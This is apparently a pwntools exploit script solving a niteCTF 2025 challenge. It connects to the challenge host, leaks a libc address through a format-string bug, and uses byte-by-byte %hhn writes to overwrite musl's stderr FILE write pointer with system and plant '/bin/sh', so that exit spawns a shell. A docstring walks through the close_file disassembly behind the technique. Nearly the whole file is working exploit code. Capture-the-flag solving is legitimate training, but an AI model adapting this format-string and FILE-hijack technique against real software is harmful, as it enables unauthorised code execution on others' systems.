#!/usr/bin/env python3
from pwn import *

exe  = context.binary = ELF(args.EXE or './chall')
libc = ELF(exe.libc.path)

def fmt(payload):
    assert len(payload) <= 48
    io.sendlineafter(b'>>', b'1')
    io.sendlineafter(b'index:', b'0')
    io.sendlineafter(b'>>', b'1')
    io.sendlineafter(b'>>', cyclic(0x20))
    io.sendlineafter(b'>>', b'2')
    io.sendlineafter(b'index:', b'0')
    io.sendlineafter(b'leave..', payload)
    io.recvline() ; io.recvline()

io = remote("yellow.chals.nitectf25.live", 1337, ssl=True)

"""
overwrite the function ptr at +0x48 to system
which is called in close_file

pwndbg> disas close_file
Dump of assembler code for function close_file:
=> 0x00007ffff7fa1bd8 <+0>:     test   rdi,rdi
   0x00007ffff7fa1bdb <+3>:     je     0x7ffff7fa1c2f <close_file+87>
   0x00007ffff7fa1bdd <+5>:     push   rbx
   0x00007ffff7fa1bde <+6>:     mov    eax,DWORD PTR [rdi+0x8c]
   0x00007ffff7fa1be4 <+12>:    mov    rbx,rdi
   0x00007ffff7fa1be7 <+15>:    test   eax,eax
   0x00007ffff7fa1be9 <+17>:    jns    0x7ffff7fa1c1e <close_file+70>
   0x00007ffff7fa1beb <+19>:    mov    rax,QWORD PTR [rbx+0x38]
   0x00007ffff7fa1bef <+23>:    cmp    QWORD PTR [rbx+0x28],rax
   0x00007ffff7fa1bf3 <+27>:    je     0x7ffff7fa1bff <close_file+39>
   0x00007ffff7fa1bf5 <+29>:    xor    edx,edx
   0x00007ffff7fa1bf7 <+31>:    xor    esi,esi
   0x00007ffff7fa1bf9 <+33>:    mov    rdi,rbx
   0x00007ffff7fa1bfc <+36>:    call   QWORD PTR [rbx+0x48]
...SNIP...

the rdi is as usual the address of the file structure
one more thing to notice here is this check:

   0x00007ffff7fa1beb <+19>:    mov    rax,QWORD PTR [rbx+0x38]
   0x00007ffff7fa1bef <+23>:    cmp    QWORD PTR [rbx+0x28],rax
   0x00007ffff7fa1bf3 <+27>:    je     0x7ffff7fa1bff <close_file+39>
   
so, it checks if the contents at +0x38 & +0x28 are the same and if they are this call is skipped. by default both of them are zero so, we have to change one of them so it's not zero
and, backtrace looks like this:

exit -> __stdio_exit -> close_file

update:
+0x28 : wpos        /* write position pointer */
+0x38 : wbase       /* write base pointer */
+0x48 : write       /* write function pointer */

so, the check is that if both are equal i.e there is nothing to write ... then don't call the write function
else call it ... kinda like glibc

look at the _IO_FILE struct here: https://git.musl-libc.org/cgit/musl/tree/src/internal/stdio_impl.h
"""

fmt(b'%p.'*10) ; libc.address = int(io.recvline().strip().split(b'.')[5], 16) - 0xbe280

writes = {
    libc.sym.__stderr_FILE: u64(b'/bin/sh\x00'),       # rdi
    libc.sym.__stderr_FILE+0x28: 1,                    # wpos != wbase
    libc.sym.__stderr_FILE+0x48: libc.sym.system,      # +0x48: size_t (*write)(FILE *, const unsigned char *, size_t)
}

for addr, value in writes.items():
    for i in range(8):
        payload = b''
        payload += b'%*c' * 3 + b'%p' * 4
        payload += f'%{((value >> i*8) & 0xff) + 195}x'.encode()
        payload = payload.ljust((len(payload) + 7) // 8 * 8, b' ') + b'.%hhn.'
        payload = payload.ljust((len(payload) + 7) // 8 * 8, b' ') + p64(addr + i)
        fmt(payload)

io.sendlineafter(b'>>', b'3')
io.interactive()

